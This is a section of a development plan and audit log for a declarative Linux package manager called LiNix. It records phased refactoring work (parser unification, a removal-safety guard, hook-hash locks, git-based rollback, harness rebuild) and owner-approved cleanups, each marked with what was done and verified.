# Part III — The work

*[LiNix v7](../SPEC.md) — the map is there; this is one part of it.*

## What already exists (written against branch `v6`, which is now `main` — the sole branch)

Four stages of the old plan are committed. **Read this before deleting anything.**

| | commit | fate |
|---|---|---|
| **Stage 1** — the guard, backend manual-listing labels, apt `showmanual`, conda `--from-history`, essential parsing, `unmanage` | `47f82b6` | **Keep.** Becomes Phase 3's foundation. The `ManualListing` taxonomy and `guard::protection_of` are the right shape. |
| **Stage 2** — `Migrator::discover()`, one crawl shared by migrate and audit, `manual_source()`, atomic manifest write | `9847544` | **Keep.** Becomes `adopt` (II.9). **Except** its protected-skip — see II.9, E7. |
| **Stage 3** — harness config isolation, the `okf` coverage ratchet, the JSON-check fix | `d1b1edc` | **Mostly superseded.** The harness is rebuilt in Phase 5. Keep the isolation and the ratchet idea. |
| **Stage 4** — the `-g` overlay model, `wish_dirs()`, `config_root()`, `is_reserved_manifest` | `fb9f08c` | **Thrown away.** Phase 0 deletes `-g` entirely. This is real work that this design discards, knowingly (V.1). |

**Stage 4 is a deliberate write-off.** It correctly fixed `-g` by making it additive; the
new model deletes the flag instead. Do not try to preserve it.

## Phase 0 — Delete

> **⚠ Marked ✅ elsewhere in this document. It is not done** (audited 2026-07-17, twice;
> Part VII). The `-g` *flag* is gone. **`keep.txt` and `_active_profiles.txt` are now genuinely
> dead** (Phase 2e/2f); `groups_dir` (≈51 refs, was 84), `prune` and `migrate` (606 lines) are
> still live, and **`local.txt` still has readers** — `insight.rs:418` `line_declares`, which
> Part VII wrongly recorded as deleted.
> **The reason it matters is in this section's own first line:** *do this first so nothing is
> carefully ported that was about to be deleted.* That is now happening.

**Pure subtraction. Nothing new can break. Tests stay green except those testing deleted
features.** Do this first so nothing is carefully ported that was about to be deleted.

Delete everything in II.17. Delete the ~884 marketing comments. Delete every legacy branch
(`generation.rs` bare-filename keys, the `<name>/`-directory profile form).

**Exit:** `cargo test` green. Codebase measurably smaller. Report the line count removed.

## Phase 1 — One parser and the grammar

> **⚠ Marked ✅ elsewhere in this document. Half done** (audited 2026-07-17, Part VII).
> **The grammar is built and it is good. The unification never happened:** `grammar/statement.rs`
> was added *alongside* the other parsers rather than substituted for them. The bullet directly
> below is the unmet one — it is a *replacement*, not an addition, and the ✅ was awarded for the
> addition. **Re-audited 2026-07-17: it is now three skippers, not six** (`insight.rs:428`,
> `manifest.rs:90`, `main.rs:1378`) — **and the bullet's own citation has rotted: `resolver.rs:212`
> no longer parses anything**, because Phase 2d rewired it onto `model::Resolver`. The count in
> that bullet is wrong in the direction this document never errs in — **the tree got better and
> the doc did not notice.** Do not read this as licence to trust it; read it as the tripwire
> working.

**C13 and the grammar are one job, not two.** The grammar *is* the parser; unifying five
parsers against the old grammar just to rewrite them is work done twice.

- One `backend:name` parser. **(re-measured 2026-07-16: EIGHT exist, SIX skip backend
  validation)** — including `resolver.rs:212`, the one that builds every `PackageSpec`.
  Only `split_removal_target` and one inline site at `main.rs:647` consult the registry.
  Every new prefix (`absent:`, `repo:`, `shim:`, `schedule:`, `re:`) is a thing a
  non-validating parser reads as a backend name. *(The first draft said five and three.)*
- Reserve `re` against the onboarder's custom backends.
- `{ }` blocks. Header decides body kind (keyword → lines, declaration → options).
- Comments: whole-line, trailing on statements, **never inside block values**.
- Options: short form (no commas), block form (verbatim to EOL), repeated key = list.
- `@2.0` → error. `@requires=bar` (bare) → error.
- **Unknown line → error**, naming file, line, and what was expected.

**Exit:** unit tests for every grammar rule above, including every error case.

> **Three II.2 rules had no implementation (audited 2026-07-17). ALL THREE now closed (Phase
> 2q) — the audit was right, and each is now enforced with a test.**
>
> - **~~`@until` "on `absent:` only" is not enforced~~ — FIXED (Phase 2q).** `validate_options`
>   now takes an `absent: bool` (threaded from the `absent:` branch of `parse`), and a present
>   line carrying `@until` is refused, naming the file and line, with a hint pointing at
>   `@expires`. Test: `until_on_a_present_line_is_refused`. `apt:jq@until=…` no longer parses
>   clean. *(The comment that "read exactly like a check" is now a check.)*
> - **~~II.2's option-key table is not a whitelist~~ — was already FIXED by S19 (Phase 2l).**
>   `validate_options` rejects any key not in `PACKAGE_OPTION_KEYS` (plus the `*_install`
>   suffix). `apt:jq@versionn=1.6` errors, listing the real keys. Test:
>   `an_unknown_key_lists_the_real_ones`. This audit bullet was stale by the time it was written.
> - **~~`link:` cannot take a Windows path~~ — FIXED (Phase 2q).** The expression check now runs
>   only when the line does *not* open with a typed-statement prefix (`starts_with_statement_prefix`
>   guards `absent:`/`repo:`/`shim:`/`schedule:`/`service:`/`link:`). `link:C:\Users\me\.vimrc`
>   parses as `Statement::Link` again; a bare `editors | fonts` is still an `Expr`. **II.4's set
>   math no longer eats II.2's statements.** Test: `a_link_with_a_windows_path_is_a_link_not_an_expression`.
>
> Also, two smaller findings, both now resolved/tracked:
> - **~~`statement.rs:66` calls the enum "II.2's full list" but it includes II.4's set ops~~ —
>   FIXED (Phase 2x):** the doc comment now says it is the union of II.2's statements and
>   II.4's set-math, not "II.2's full list".
> - ~~**`schedule:NAME` "(only in `schedules`)" has no file-context check — it parses in a
>   module.** Still true, and it is **part of wiring `schedule:` at all**, which is unbuilt:
>   the layout has `schedules_file()` but the resolver never reads it, so `schedule:` only ever
>   lands in `extras` and `sync` warns it is unapplied (S12).~~ — **DONE (verified 2026-07-20).**
>   S21 wired the scheduler on 2026-07-17; `resolve.rs:303-305` reads `schedules_file()`, and the
>   file-context check is at `resolve.rs:516` with a test at `:982`. The warning this passage
>   cites was deleted in the `rebuild` session. **A live `[schedules]` table still exists in
>   `Config` beside the file, so there are two schedule stores** — see the audit.

## Phase 2 — The model (the cliff)

**Cannot be split.** Everything above the seam breaks at once. Do not run two models behind
a flag — that is the "two ways to do one thing" disease, done to ourselves.

- The layout (II.1). `modules/`, `profiles/`, `active`, `priority`, `schedules`, `locks/`,
  `preferences.toml`.
- The resolver (II.7): profiles choose, lazy parsing, conflicts are errors, the layering
  rule, dated lines.
- Profile set algebra, resolved at read time. **No `_active_profiles.txt`, no
  materialization.**
- `PackageSpec` gains **present/absent**. That is the only new thing the desired-state map
  can't already carry.
- Ordering phases in the planner: repos → index refresh → packages → dependents.
- The command surface (II.8).

**The seam:** everything upstream produces `HashMap<backend, Vec<PackageSpec>>`; everything
downstream consumes it. `src/backends/` (11,193 lines), `src/core/` (4,499), and
`src/parsers/` (2,275) — **~45% of the codebase — never notice this happened.**

**Exit:** the harness green on one distro.

> **Exit-condition ordering, resolved (2026-07-17).** This exit collides with Phase 5, which
> *rebuilds* the harness for the new model — you cannot run "the harness" green on the new model
> before Phase 5 makes one that understands it, and the old harness asserts the old
> (pre-seam) surface. So the exit splits in two, honestly:
> - **The model-side of Phase 2 is complete** — every checklist box is `[x]`, 521 unit/integration
>   tests pass, clippy is silent, and the command surface, resolver, ordering phases and
>   deletions are all verified against the binary. That is everything Phase 2 *builds*.
> - **The green-harness-on-one-distro gate is carried to Phase 5/6**, which own the harness
>   rebuild (Phase 5, first bullet) and the five containers (Phase 6). It is not skipped — it is
>   filed where the harness it names actually exists. The two functional follow-ups found here
>   (**S20** extras-drift → Phase 4, **S21** `schedule:` wiring → Phase 5) are tracked in VI.2, so
>   nothing about "the model" is left implicit in this decision.

## Phase 3 — The guard

- 16 → 9 (II.10). One decision function. *(The first draft said five, then six. The owner
  chose to keep all three orphaned `policy.toml` rules rather than delete them — V.43.)*
  **Audited 2026-07-17 — the starting point is not what II.10 implies.** Four of the nine are in
  `guard.rs` (`protected_packages`, `unprotected_packages`, OS-essential, `max_removals`); four
  are in a **separate `Policy` struct** (`app/policy.rs`) loaded from `groups_dir/policy.toml` —
  **a file II.17 deletes** — with `require_snapshot`/`deny_vulnerable` enforced ad-hoc in
  `main.rs:3176`/`:3181` rather than in any guard; and ~~**`max_installs` does not exist anywhere
  in `src/`**~~ — **DONE (install ceiling): `Config::max_installs` (default 0 = unset) +
  `guard::enforce_installs` + `Objection::TooManyInstalls`, enforced at the one sync choke point
  (`SyncEngine::sync`), with `--allow-mass-install` (CLI-only, mirrors `allow_mass_removal`). Five
  tests.** ~~`policy.rs:25` also has a **tenth rule the spec never mentions**
  (`allow_backends`).~~ **DONE — `allow_backends` deleted, not migrated: the `priority` file is
  what "only these backends" means now (V.15).** **"One decision function" is the work, not the
  summary:** ~~today there are three (`guard::protection_of`, `guard::inspect`,
  `Policy::check_specs`)~~ — **DONE (consolidation): `policy.rs` is deleted and its four rules now
  populate `GuardSettings` (the `[guard]` table, their II.17 home). The guard owns the spec-level
  checks — `guard::inspect_desired` → `Objection::Denied`/`Unpinned`, rendered by
  `describe_objection`; `require_snapshot`/`deny_vulnerable` stay in `enforce_policy` (they need
  the snapshot provider + audit report) but read `config.guard` and share the violation list.
  `enforce_policy` and `handle_policy` read `[guard]`, not `policy.toml`.** `Objection`
  (`guard.rs`) ~~has **two variants**~~ **now has five (`Protected`, `TooMany`, `TooManyInstalls`,
  `Denied`, `Unpinned`).** ~~`--allow-mass-install` (II.10:578) does not exist either.~~ **DONE.**
  ~~**Remaining mechanical step:** the four removal-count rules (`protected_packages`,
  `unprotected_packages`, `max_removals`, `max_installs`) still sit as top-level `Config` fields;
  renaming them under `[guard]` alongside the other four is all that is left of "one home".~~
  **DONE — all nine now live in the `[guard]` table.** The four moved into `GuardSettings` with a
  manual `Default` so the removal-safety defaults survive (an empty protected list or a zero
  ceiling there would silently disarm the guard); `is_empty()` stays scoped to the install/change
  rules only; the config template, `examples/config.toml`, `linix protected`, and the refusal
  messages all read/emit `[guard]`. **"Nine refusals, one home" is now literally true.**
- **Every removal path calls it.** ~~Today's misses: `uninstall` (C1), leases and `absent:`
  (C3), ghost-shell exit (C8), `clean`.~~ **Mostly DONE by architecture, verified 2026-07-17:
  plain `uninstall` undeclares then calls `handle_sync` → guarded (`GuardScope::Sync`); `absent:`
  becomes drift removed by sync → guarded; ghost-shell `suspend_for_session` calls
  `guard::enforce` explicitly (`main.rs:1222`); leases were deleted in Phase 2, so C3's lease
  half no longer exists. THE ONE REAL MISS IS `clean`** — it calls `clean_orphans` directly, and
  routing it through the guard needs a backend `list_orphans` capability (list intended orphans,
  check against protection, refuse if any is protected) that does not exist yet — a ~20-backend
  trait addition, its own chunk.
- ~~One lease-expiry implementation (C9 — two exist today with different semantics).~~ **Moot —
  leases were removed entirely in Phase 2 (the `lease` command, `LeaseArgs`, and both expiry
  paths are gone; timed absence is now the dated-line machinery, `@expires`/`@until`).**
- ~~The ratio check and `purge-unmanaged` (II.11).~~ **DONE — `handle_purge_unmanaged` prints the
  whole list, applies the ratio check (`PURGE_RATIO = 0.1`) with II.11's exact message before
  anything else, uses `enforce_deliberate` (protection + OS-essential apply, `max_removals` does
  not), takes a snapshot first or prints "THERE IS NO UNDO FOR THIS", and requires a typed
  count. Tests in `main.rs::purge_tests` (3/576 and 1/14 refused, 103/476 and adopted-Alpine
  allowed).**
- ~~`unprotected_packages` must beat OS-essential (B3 — the code clears the config rule, then
  falls through to the OS check, which fires anyway).~~ **DONE — `guard::protection_of` checks
  `unprotect_rule` first and returns `None`, before the OS-essential check runs; proven by the
  `unprotect_wins_over_the_os_essential_flag` test.**

**Exit:** a test per removal path proving the guard fires.

## Phase 4 — Locks and git

- `locks/` (II.6): version, resolved backend, frozen regex expansions, hook hashes.
  - **hook hashes — DONE (II.12 "the lock is the approval"), 2026-07-17.** New pure module
    `core/hook_lock.rs`: `HookLedger` (→ `locks/hooks.toml`, a `BTreeMap<hook_id, sha256>` that
    diffs cleanly), `hash_script`, `hook_id`, the `Verdict` enum (`Approved`/`New`/`Changed`),
    and the II.12 refusal message. `LuaHooks` gained `verify_all_approved()` — the supply-chain
    gate — called with `?` at the **top of `SyncEngine::sync`**, before any hook runs and before
    anything is touched, so a new or changed hook **stops the sync**; `-y` cannot skip it (the
    old `run_before_sync` swallowed its own errors, which is why the authoritative stop had to
    move here). `linix lock` now also approves hooks (`approve_all_hooks`) — the only writer of
    an approval, so approval stays deliberate. **What I checked:** `cargo build --all-targets` is
    clean; **11 unit tests written but NOT executed this session** (no-run constraint) — they
    cover hash stability/sensitivity, the New/Approved/Changed verdicts, identity isolation,
    re-approval, TOML round-trip, missing-file load, and both refusal messages. **Honest gaps:**
    (1) it currently hashes the **inline `config.hooks`** scripts (source tag `"config"`) — the
    whole-sync `before_sync`/`after_sync` kind. Per owner ruling 2026-07-17 that source **stays**
    (II.12's two kinds; `[hooks]` is off the delete list), so this is done and correct, not a
    to-be-migrated surface. **Still owed:** the *per-package* hooks (`before_install`/`after_install`,
    including module-attached ones from `github:x/y`) are not yet run through the ledger — the
    mechanism is identical and reusable, but that wiring is the remaining half. (2) `plan` does not yet show the trust
    block (II.12's "adds repository / runs script [approved|CHANGED]"). (3) **Behaviour change:**
    a user with existing `config.hooks` must now run `linix lock` once before the next sync — the
    intended II.12 behaviour, but a change. (4) ~~The version-pin `locks.json` still sits beside
    `locks/` — its migration under `locks/` (below) is unchanged.~~ **DONE, 2026-07-17 — moved to
    `locks/versions.json`, joining the hook and extras ledgers; `locks/` is now the one home for
    all lock state (II.6). All read/write/doctor/help sites updated.**
- Commit on successful sync only. snapshot → apply → commit. Tag the snapshot.
- ~~`git checkout` + `sync` = rollback. Delete the generation format.~~ **DONE, 2026-07-17
  (owner-approved migration, steps A–C).** (A) `linix rollback <ref>` checks out the manifests at
  a git commit then syncs — the one rollback; the per-package/`--with-config` flags are gone
  (git checkout is whole-config). (B) The `cockpit` TUI was rebuilt on git history (timeline =
  commit log; each row shows the manifest lines that commit changed, via
  `GitManager::commit_manifest_changes`; rollback checks out + syncs). (C) `src/app/generation.rs`
  (745 lines) and the whole subsystem deleted — `record_generation`, `rollback_to`,
  `generation_store`, `handle_generation`, the `generation` CLI command + args,
  `RetentionConfig.generations`, and `undo`'s `restore_matching_generation` (a whole-`/` snapshot
  already reverts manifests + registry). **Checked:** `cargo check --lib`/`--bin`/`--tests` all
  clean, no warnings; unit tests written (cockpit render + `parse_manifest_changes`), not run.
- ~~`linix diff COMMIT COMMIT` in packages, not text.~~ **DONE, 2026-07-17.** `linix diff <from>
  [to]` prints the manifest lines added/removed between two commits (omit `to` → vs the working
  tree), plus an `N added, M removed` tally. Since manifests are package declarations, the diff of
  the config files IS the package-level story — new `GitManager::diff_manifest_changes` runs `git
  diff` limited to `modules/profiles/active/priority/schedules` and keeps the `+`/`-` lines (shared
  `parse_manifest_changes` with the cockpit). `cargo check --lib`/`--bin` clean; a git-repo unit
  test written (not run).
- ~~`bundle` = `git bundle` + artifacts + registry, **honest per-backend about what can't be
  bundled**.~~ **DONE, 2026-07-17.** It already copied the whole config root + `packages.json` +
  artifacts (with per-backend skip reporting); added the two missing halves: a `git bundle
  create --all` → `config.bundle` (full manifest history, so the air-gapped host can `rollback`
  to any commit — new `GitManager::bundle`, returns false + honestly reported when there's no
  repo/commits), and a copy of the ownership `registry.json` from the data root (II.1 — it lives
  beside the config, not in it). The bundle output now states each part's inclusion plainly
  (included / NOT included and why). `cargo check --lib`/`--bin` clean.
- ~~One retention engine.~~ **DONE, 2026-07-17.** There were two: generations and the `sync`-time
  snapshot prune both used `core::RetentionPolicy` (the correct engine, with the "always keep the
  newest" floor and the LiNix-ownership filter), but `App::prune_snapshots` (the `auto_prune`
  maintenance path) used a **separate** `SnapshotManager::prune_stale_snapshots` with different
  semantics — notably **no newest-floor**, so if every snapshot was older than `max_age_days` it
  deleted them all, leaving no rollback point. Deleted that duplicate; `prune_snapshots` now goes
  through `prune_with_policy` like `sync` does. Config was also doubled — **owner decision (NO
  LEGACY): the legacy `[snapshots]` `max_age_days`/`max_count` keys are DELETED.**
  `[retention.snapshots]` is the one surface; `Config::snapshot_retention()` reads it, and both
  call sites use it. To avoid a silent behaviour change (an empty policy keeps everything, so
  snapshots would accumulate), `RetentionConfig::default().snapshots` is now active — keep 10 /
  30 days, exactly what the deleted keys used to provide — while generations/manifests keep their
  keep-everything default. The `init -i` wizard writes `retention.snapshots.keep_last`. **Checked:**
  `cargo check --lib`/`--bin` clean, no warnings; **2 unit tests updated but NOT run** (default is
  10/30; explicit policy read straight through) + the wizard tests. The OS-level delete is
  untestable here; the policy resolution + selection is pure.

**Exit:** an air-gapped container restores from a bundle, or bundle says why it can't.

## Phase 5 — Harness and docs

- **Rebuild the harness for the new model — STARTED, 2026-07-17.** The old
  `docker/integration/run-in-container.sh` (1112 lines, built on the deleted `-g` flag +
  `generation`/`lease`, 102 soft assertions) was **DELETED, not kept** (NO LEGACY — a "legacy"
  file is a file to delete on sight; standing rule from the owner). Replaced with a **lean v7
  harness** (~172 lines) driven entirely through the real v7 CLI: `LINIX_CONFIG_DIR`/
  `LINIX_DATA_DIR` isolation, `linix init` to scaffold the II.1 repo, and **HARD** exit-code
  assertions (`ok`/`nok`/`grep_ok`; the run exits non-zero on any hard failure — so G2's
  soft-assertion problem is gone by construction). It covers the Part IV proofs: adopt takes the
  manual set and python3 survives; a protected package is never removed; `purge-unmanaged` is not
  a silent mass-delete; plus install→list→idempotency→remove, dry-run safety, git rollback/diff,
  read-only verbs, and a command-surface smoke. **Not run here** (needs Docker — untestable on
  Windows). **Remaining:** re-port the old script's comprehensive *multi-backend real-lifecycle
  sweep + plan-smoke* (cargo/npm/pip/… each installed for real) into this harness — that breadth
  was the old script's value and is a later, container-testable job.
- **G2 — CORRECTED 2026-07-17 (my earlier "moot" was wrong).** The soft assertions are not in
  Rust (the `src/`/`tests/` grep is genuinely empty) — they are in the **shell container harness**
  `docker/integration/run-in-container.sh`, which has **102 `soft "…"` calls** (matches the "104").
  That harness is not merely soft-assertion-heavy, it is **architecturally obsolete**: it is built
  on the deleted `-g` flag (`lx -g "$GDIR"` on nearly every line), plus the deleted `generation`
  command, `lease`, and the old `locks.json` path. It cannot run against v7 at all. So G2 folds
  into "rebuild the harness for the new model" (below) — the container harness needs a rewrite, at
  which point soft→hard is part of the rewrite. **Not started** — it is a large shell rewrite,
  untestable without Docker.
- **G3 — mostly DONE, 2026-07-17.** `shim` (shim_manager tests, S1/S4), `adopt`/`migrate`
  (migrate.rs test module), `cockpit` (rebuilt on git with render tests), and `undo`
  (calculate_diff unit tests just added) are now covered. **`teleport` remains the thin
  gap** — but its core mechanism is the remove→install DAG executed by `Transaction`, which IS
  tested (`dag_test`); only teleport's own "already on target = no-op" / "not found = error"
  branches are unverified, and those need mock-query wiring. Low residual risk.
- ~~**H2:** two error-swallows on safety paths — `sync/mod.rs:463` (failed rollback-remove
  goes unreported), `shell/mod.rs:126` (dropped state write).~~ **DONE — the rollback swallow
  was actually in `core/transaction.rs::rollback` (the line number had drifted): every
  compensating action used `let _ =`, so a rollback that couldn't reinstall a just-removed
  package left it silently MISSING. It now reports each failure by name, returns Err, and all
  three auto-rollback call sites log it. GhostShell's dropped state write (`shell/mod.rs`) now
  warns with the true consequence.**
- **F4:** `--help` asks the registry for the backend count. The README line is generated.

  **The GOAL is met; the MECHANISM named here was not built. 2026-07-19.** Recorded this way on
  purpose, following the SEC5 precedent above — a ruling reported as implemented when only its
  effect holds is the failure mode this document exists to stop.

  The problem F4 names is two numbers for one fact: `args.rs` said "50+ backends", `lib.rs` said
  "33+", the README said "50+", and all three were typed. **All three are now deleted** — the
  `--help` tagline and crate docs describe what the tool does and carry no count, and the
  rewritten README carries none either. Nothing is left to go stale, which is what F4 was for.

  **What does not exist is `--help` querying the registry.** Building the registry needs a
  `CommandExecutor`, the `Config`, and `LuaHooks`, and it loads user-defined backends from
  `custom_backends.toml` — so wiring it into `--help` would make the help text read config and
  a user file from disk, and give `--help` a way to fail. That is a bad trade for a cosmetic
  number.

  **The generated count already exists where the registry is already built:** `linix doctor`
  opens with `Backends: 26 OK, 0 degraded, 17 critical (of 43 total)` — counted from the live
  registry, so it is per-machine and cannot rot. The README points readers there instead of
  quoting a number. **If the owner wants the count in `--help` specifically, that is the
  remaining work and it is not done.**
- ~~**F1:** `network_timeout_secs` — **honour it** (today every consumer applies an
  undocumented `.max(10)` floor, so setting 5 silently gives you 10).~~ **DONE — both consumers
  (`insight.rs` audit client, `main.rs` module-fetch client) now use `.max(1)`, matching
  `node_registry`'s existing guard: honour any value ≥1, reject only a literal 0 (which reqwest
  reads as instant-fail, not "no timeout").**
- ~~**F1:** `max_parallel` — detect the core count.~~ **DONE. `default_max_parallel()` uses
  `std::thread::available_parallelism()` (respects container CPU limits), falls back to 4; the
  Default impl routes through it and the generated template comments the key out** (`config.rs:216`,
  `:304`; `main.rs:3117`). The 2026-07-17 audit flagged this DONE as contradicting II.17 (which
  listed `max_parallel` for deletion) and II.1 ("detected, never configured"). **Owner ruled
  2026-07-17: keep the manual override** — the core count is the default, but you may cap concurrency
  by hand. II.1, II.17, and V.41 were amended to match, so the contradiction is closed, not carried.
  The key is honoured for real: `sync/mod.rs:297` reads it (the old overwrite V.41 called "a lie" is
  gone). F1 is genuinely done.
- ~~**F1:** the generated `priority` file carries its reason in a comment (V.14).~~ **DONE —
  `model::priority::starter_file` (wired into `init` at `main.rs:4457`) already writes the
  "system managers first / pip last / when-block" rationale as the file header.**
- **F5:** fix the false doc comments.

  **DONE 2026-07-19 — but only two of the six were fixed by this session, and the entry deserves
  the split.** F5's list lives in `AUDIT-v6.org:602`. Checked one at a time against `HEAD`:

  - `migrate.rs` — `audit()` documented as a *"destructive Discovery cycle"* in a sentence that
    then said it generates no files and acquires no state. **Already fixed**; `grep -n
    destructive src/app/migrate.rs` is empty.
  - `config.rs` "names removal must never touch" and `parsers/mod.rs` "whatever a manifest says"
    — the audit called both untrue because `remove`, bloatware, leases and transient cleanup all
    bypassed protection. **Both are now true, because the code moved to meet them, not the
    comment**: `essential_names` feeds `guard::inspect` (`guard.rs:236`), which every removal
    path reaches through `enforce`, plus the lease sweep, adoption, and `linix protected`.
  - `planner.rs` — "silent about the consequence, that it makes `plan`/`apply` destructive while
    `sync` isn't". **The consequence no longer exists**: v7's `sync` converges by default, so
    there is no asymmetry left to disclose.
  - **Fixed here:** `context.rs::sweep_expired_leases` documented itself with `linix install
    foo@lease=30d` and "the next explicit `sync`/`prune`" — **`@lease` is not an option key (the
    grammar rejects it with a hint) and `prune` is a deleted command**, so a doc comment was
    teaching a reader two things that error out. It now says `@expires`. Three surviving "ghost
    shell" references went too (R14).

  **Also audited mechanically, and clean:** every ``name()`` in a comment resolves to a defined
  symbol, and every file path named in a comment either exists or is explicitly marked as the
  old layout (`locks.json`, `policy.toml` — both phrased as what was replaced).
- ~~**P6** goes in `CLAUDE.md`.~~ **DONE — repo-root `CLAUDE.md` carries P6 (comment states a
  constraint, nothing else) plus NO LEGACY, one `backend:name` parser, every-removal-path-guards,
  prefer-deleting, and the verify chain.**

### Rough edges — the 2026-07-17 review pass (owner-approved, one line each)

A read-through of the actual code for things that are silly, confusing, or unintuitive — silly
messages *and* silly features (a feature no user wants, two features that are really one, or a
feature with a better way to do it). Each line below is an owner-approved change, not a proposal.
**These are NO-LEGACY deletions: better code already exists (edit the file, sync). Do not
preserve the old thing or build a compatibility helper — remove it. The teardown shape is the
implementing agent's call; that it goes is not.**

- **R1 — Kill the theatrical house voice.** The tool narrates routine work like a spaceship:
  `LiNix Kernel: … kernel initialized successfully` on **every** command (`context.rs:116`),
  `Kernel: Commencing system-wide batch upgrade` (`context.rs:457`, `:446`, `:744`), `GhostShell:
  Dropping into hardened sandbox` / `Purging ephemeral state` (`shell/mod.rs:101`,`:114`,`:138`),
  `Cleaner: Initiating deep system cleanup` (`clean.rs:15`), `Teleporter: Executing atomic
  transition transaction` (`teleport.rs:124`). Logging defaults to `info` on stderr
  (`main.rs:43-46`), so all of it reaches ordinary users. Two fixes: (a) drop the
  `Component: TheatricalVerb…` style for plain, quiet language, and (b) demote pure-status lines
  like "kernel initialized" to `debug!` so they stop printing every run. The bar is `apt`/`dnf`:
  near-silent on a normal run.

  **DONE 2026-07-19.** 149 log lines lost a `Component:` prefix, and the theatrical verbs went with
  them ("Commencing system-wide batch upgrade" → "upgrading all packages"). Pure-status lines were
  demoted to `debug!`: the kernel banner, the bootstrap line, service assembly, "Dropping into
  hardened sandbox", both cleanup lines, and `Heal`'s "already verified via WAL". **One judgement
  call the entry did not make, recorded because it is a line someone could reasonably draw
  elsewhere: LiNix's self-branding prefixes were stripped (`Kernel:`, `GhostShell:`, `Cleaner:`,
  `Migrator:`, `Resolver:`, `Transaction:`, `Journal:`, …) but backend-name prefixes were kept**
  (`Cargo:`, `DNF:`, `Pacman:`). The first is the tool narrating itself; the second says *which
  package manager acted*, which is the one thing `apt`/`dnf` output does tell you.
  `grep -rn "Kernel:\|GhostShell\|Cleaner:" src/` is silent.

- **R2 — Delete `teleport` outright.** A teleport is a prefix rewrite: `apt:nginx` → `snap:nginx`,
  then sync. The declarative model already does that — change the backend on the line and sync
  removes it from the old backend and installs it on the new. But `Teleporter` (`app/teleport.rs`)
  builds its **own** remove→install `StableDiGraph` and runs `Transaction::execute()` directly
  (`teleport.rs:107-133`), and `core/transaction.rs` has **no** guard call — so
  `teleport python3 snap` rips out `apt:python3` with no protected/essential/max-removal check.
  It is a second transaction engine *and* a guard bypass, for an operation that is one line-edit.
  Delete the command, `Teleporter`, `move_the_line`, and the CLI entry (`cli/args.rs:343-349`,
  handler `main.rs:3101`). A backend move is "rewrite the prefix, sync" — nothing more. If a
  convenience verb is ever wanted it must route through `handle_sync` (guard included), never its
  own transaction.

  **DONE 2026-07-19.** `src/app/teleport.rs` deleted; `App::teleporter`, `AppServices::teleporter`,
  the `mod`/`pub use`, the CLI variant and `handle_teleport` all removed. Two things went with it
  that the entry did not name: `GhostMetadata::teleported_to` (a field only ever written `None` —
  dead the moment the writer left) and the `Some("teleport")` provenance arm in `insight.rs`, which
  described a source nothing can produce any more. The two tests that named the feature
  (`test_e2e_cross_backend_teleport`, `test_teleport_api_consistency_on_missing_package`) were
  deleted with it, not ported. `grep -rni teleport src/ tests/` is silent.

  **Re-verified 2026-07-24: teleport is BACK, and R2's own ruling is why it is allowed.** The
  imperative `Teleporter` (its own transaction, guard-bypassing) is still gone; what exists now
  is a *declarative* `teleport` — `handle_teleport` → `App::retarget` (rewrite the line) →
  `handle_sync` (the guard). R2 said a convenience verb is fine "if it routes through
  `handle_sync`, guard included, never its own transaction", which is exactly this. The stale
  half is this entry's "grep is silent"; the safe half (one transaction engine) holds.

- **R3 — Delete the imperative `shim` command; shims are declarative only.** A shim is a small
  PATH stand-in that forwards to a managed tool. It is already produced declaratively: `@shim=true`
  on a package line, and `sync`'s `reconcile_all_shims` (`sync/mod.rs:148`,`:360`) creates it — and
  owns it (an imperatively-made shim is cleaned up on the next sync if the line lacks `@shim`). The
  `shim` command (`cli/args.rs:106-113`, handler `context.rs:828`) is a second, self-undoing path,
  and its **required** `--source` flag is discarded (`create_shim` binds it to `_source_spec` and
  never reads it) — a mandatory flag that does nothing. Owner ruling: go fully declarative. Delete
  the command and the dead flag; `@shim=true` + sync is the only way to make a shim.

  **DONE 2026-07-19.** The `Shim` CLI variant, `handle_shim`, and the `App::create_shim(binary,
  _source_spec)` wrapper that swallowed the dead flag are gone. `ShimManager::create_shim` stays —
  it is what `sync`'s `reconcile_all_shims` calls, and it never took a source in the first place.

- **R4 — Delete `generation rollback`; it is a subset of top-level `rollback`.** Both dispatch to
  the same `rollback_to()` (`main.rs:135` and `:1986`); `generation rollback` just hardcodes
  `with_config = false` (`:1986`). Top-level `rollback` takes `--package` and `--with-config`, so it
  does everything the generation form does and more. Owner ruling: delete `GenerationCommand::Rollback`,
  keep the top-level `rollback`.

  **ALREADY TRUE 2026-07-19 — nothing to delete, and the entry was describing a tree that no longer
  exists.** There is no `GenerationCommand`, no `Commands::Generation`, and no `rollback_to`
  anywhere in `src/`: Phase 4 moved history onto git, and the whole generation command family went
  with it. Top-level `rollback` now takes a git `reference`, not the `--package`/`--with-config`
  pair this entry credits it with. **This is the stale-in-the-other-direction failure the Part VII
  warning describes** — the fix was to check, and the check was three greps.

- **R5 — Fix `unmanage`'s broken confirmation output (key mismatch).** The result JSON is built
  with key `"lines_removed"` (`main.rs:2950`) but the human printer reads `"manifest_lines_removed"`
  (`:2971`, `:2989`) — a key that never exists. So the count always prints 0 and the "removed
  declaration … from …" lines never show. The command does the work; only its output lies. Make the
  keys agree.

  **DONE 2026-07-19.** The writer's key won; both readers now say `lines_removed`.

- **R6 — Plain notification emails; no emoji, no "Mission-Critical", no version.** The email
  subject bakes in emoji (`🚨 LiNix CRITICAL - …`, `notify.rs:151`), the body is titled "LiNix
  Mission-Critical Report" (`:153`), and the error level is "LiNix CRITICAL" (`:35`) — theatrical
  for a package-upgrade summary. The footer also hardcodes a stale version, "Automated Management
  via LiNix v5.0.0" (`:161`; tool is v6). Owner ruling: plain subject with no emoji, drop
  "Mission-Critical", and the footer reads exactly "Automated Management via LiNix" — no version
  string at all (nothing to go stale).

  **DONE 2026-07-19.** `NotificationLevel::emoji()` deleted outright rather than emptied — with the
  subject rebuilt as `"{title_prefix} - {subject}"` nothing called it. `LiNix CRITICAL` → `LiNix
  Error`, the body header → "LiNix Report", the footer → "Automated Management via LiNix". The entry
  named one `emoji()` call site; there were **three** (the subject line plus two `info!` fallbacks
  used when desktop notification is unavailable), and those now print the level name.

- **R7 — Strip all marketing language; "mission-critical" appears nowhere.** Replace the `--help`
  tagline and crate docs with a genuinely descriptive line (what it *does*: a declarative package
  manager — edit a file, sync the machine to match). This is a sweep, not one string. Kill every
  "mission-critical", "high-performance", "DAG-based orchestration", "enterprise/blazing/world-class"
  wherever it appears: `cli/args.rs:4-5`,`:12`,`:106`; `lib.rs:1`,`:3`; `notify.rs:153` (covered by
  R6); `context.rs:76`; `services.rs:98`; `core/state.rs:118`; `bin/shim.rs:4`; `main.rs:50` comment.
